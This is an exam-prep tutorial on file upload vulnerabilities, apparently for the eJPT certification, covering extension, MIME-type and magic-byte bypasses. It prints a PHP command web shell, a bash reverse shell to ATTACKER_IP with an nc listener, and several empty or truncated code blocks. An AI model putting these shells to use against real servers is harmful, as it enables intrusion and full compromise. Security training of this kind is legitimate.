# File Upload Vulnerabilities

File Upload vulnerabilities occur when a web application allows users to upload files without properly validating their type, content, or destination. If an attacker can upload a malicious file and execute it on the server, it may lead to **Remote Code Execution (RCE)**, allowing complete compromise of the target.

This is one of the most common and impactful web vulnerabilities and is frequently covered in penetration testing labs and the **INE eJPT** learning path.

---

# How File Upload Works

A typical upload process is:

```
User

↓

Upload Form

↓

Web Server

↓

Validation

↓

Storage

↓

Access File
```

If validation is weak or missing, an attacker can upload executable files instead of legitimate documents or images.

Successful exploitation may result in:

- Remote Code Execution (RCE)
- Web Shell Upload
- Sensitive Data Exposure
- Authentication Bypass
- Full Server Compromise
- Privilege Escalation
- Persistence

# Common Validation Methods

Applications may validate uploads by checking:

- File extension
- MIME type
- Content-Type header
- File signature (Magic Bytes)
- File size
- Filename
- Image dimensions
- Antivirus scanning

Poor validation often allows bypasses.

```php

```

Upload:

```

```

```
http://TARGET/uploads/shell.php?cmd=whoami
```

```php
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
```

# Reverse Shell Example

Simple PHP reverse shell:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
?>
```

Start a listener:

```bash
nc -lvnp 4444
```

# Double Extensions

Some filters only inspect the last extension.

Examples:

```
shell.php.jpg

shell.php.png

image.php.gif
```

---

# Mixed Case Extensions

Some filters are case-sensitive.

Examples:

```
shell.PHP

shell.PhP

shell.pHp
```

---

# Null Byte Injection

Older applications may accept:

```
shell.php%00.jpg
```

Modern systems are generally protected, but it is useful to understand the technique.

---

# MIME Type Bypass

Applications may verify:

```
image/jpeg
```

Intercept the request with **Burp Suite**.

Original:

```
Content-Type: image/jpeg
```

Modify:

```
Content-Type: application/x-php
```

or leave it as:

```
image/jpeg
```

while uploading a PHP file.

---

# Magic Bytes

Some applications inspect the first bytes of the file.

JPEG files begin with:

```
FF D8 FF
```

Attackers may prepend JPEG magic bytes before PHP code to bypass weak validation.

---

# Rename After Upload

Sometimes the application renames files:

```
upload.php

↓

3f82d91.php
```

Always inspect the response to determine the new filename.

# Common Mistakes

Avoid these mistakes:

- Assuming only `.php` files execute.
- Forgetting alternative extensions.
- Ignoring renamed uploads.
- Not checking hidden upload directories.
- Forgetting MIME type manipulation.
- Uploading large payloads unnecessarily.
- Failing to verify whether uploaded files are actually executed.

---

# eJPT Tips

During the **INE eJPT** exam:

- Inspect every file upload functionality you encounter.
- Test alternative extensions such as `.phtml`, `.php5`, and `.phar`.
- Intercept uploads with **Burp Suite** and modify the filename and `Content-Type`.
- Use small web shells for testing before attempting reverse shells.
- Enumerate upload directories if the file location is unknown.
- Once code execution is achieved, perform local enumeration and continue with privilege escalation.

# Summary

File Upload vulnerabilities occur when a web application fails to properly validate uploaded files, allowing attackers to upload executable content such as web shells. By exploiting weak validation mechanisms—such as relying only on file extensions, MIME types, or client-side checks—an attacker may gain Remote Code Execution and fully compromise the server. During the **INE eJPT** exam, always inspect upload functionality, test alternative extensions, manipulate requests with **Burp Suite**, and verify whether uploaded files can be executed. Successful exploitation often provides an initial foothold for further enumeration and privilege escalation.
